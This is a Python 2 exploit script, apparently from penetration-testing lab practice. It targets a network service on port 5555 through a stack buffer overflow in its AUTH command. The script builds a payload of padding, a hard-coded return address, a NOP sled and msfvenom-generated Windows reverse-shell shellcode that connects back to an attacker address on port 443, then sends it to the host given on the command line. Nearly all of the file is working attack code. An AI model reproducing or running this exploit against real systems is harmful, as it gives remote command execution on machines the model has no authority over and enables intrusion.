#!/usr/bin/env python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.16.124 LPORT=443 EXITFUNC=thread --arch x86 --platform windows -f c -b '\x00'
shellcode = (
"\xbf\xac\x28\x6b\xab\xda\xc9\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x7d\x12\x03\x7d\x12\x83\x41\xd4\x89\x5e\x65\xcd\xcc"
"\xa1\x95\x0e\xb1\x28\x70\x3f\xf1\x4f\xf1\x10\xc1\x04\x57\x9d"
"\xaa\x49\x43\x16\xde\x45\x64\x9f\x55\xb0\x4b\x20\xc5\x80\xca"
"\xa2\x14\xd5\x2c\x9a\xd6\x28\x2d\xdb\x0b\xc0\x7f\xb4\x40\x77"
"\x6f\xb1\x1d\x44\x04\x89\xb0\xcc\xf9\x5a\xb2\xfd\xac\xd1\xed"
"\xdd\x4f\x35\x86\x57\x57\x5a\xa3\x2e\xec\xa8\x5f\xb1\x24\xe1"
"\xa0\x1e\x09\xcd\x52\x5e\x4e\xea\x8c\x15\xa6\x08\x30\x2e\x7d"
"\x72\xee\xbb\x65\xd4\x65\x1b\x41\xe4\xaa\xfa\x02\xea\x07\x88"
"\x4c\xef\x96\x5d\xe7\x0b\x12\x60\x27\x9a\x60\x47\xe3\xc6\x33"
"\xe6\xb2\xa2\x92\x17\xa4\x0c\x4a\xb2\xaf\xa1\x9f\xcf\xf2\xad"
"\x6c\xe2\x0c\x2e\xfb\x75\x7f\x1c\xa4\x2d\x17\x2c\x2d\xe8\xe0"
"\x53\x04\x4c\x7e\xaa\xa7\xad\x57\x69\xf3\xfd\xcf\x58\x7c\x96"
"\x0f\x64\xa9\x39\x5f\xca\x02\xfa\x0f\xaa\xf2\x92\x45\x25\x2c"
"\x82\x66\xef\x45\x29\x9d\x78\x60\xa5\x8d\x04\x1c\xbb\xad\xf5"
"\x67\x32\x4b\x9f\x87\x13\xc4\x08\x31\x3e\x9e\xa9\xbe\x94\xdb"
"\xea\x35\x1b\x1c\xa4\xbd\x56\x0e\x51\x4e\x2d\x6c\xf4\x51\x9b"
"\x18\x9a\xc0\x40\xd8\xd5\xf8\xde\x8f\xb2\xcf\x16\x45\x2f\x69"
"\x81\x7b\xb2\xef\xea\x3f\x69\xcc\xf5\xbe\xfc\x68\xd2\xd0\x38"
"\x70\x5e\x84\x94\x27\x08\x72\x53\x9e\xfa\x2c\x0d\x4d\x55\xb8"
"\xc8\xbd\x66\xbe\xd4\xeb\x10\x5e\x64\x42\x65\x61\x49\x02\x61"
"\x1a\xb7\xb2\x8e\xf1\x73\xd2\x6c\xd3\x89\x7b\x29\xb6\x33\xe6"
"\xca\x6d\x77\x1f\x49\x87\x08\xe4\x51\xe2\x0d\xa0\xd5\x1f\x7c"
"\xb9\xb3\x1f\xd3\xba\x91"
)
#req1 = "AUTH " + "\x41"*1072
#OFFSET 1040 RET 65D11D71
req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90"*9 + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()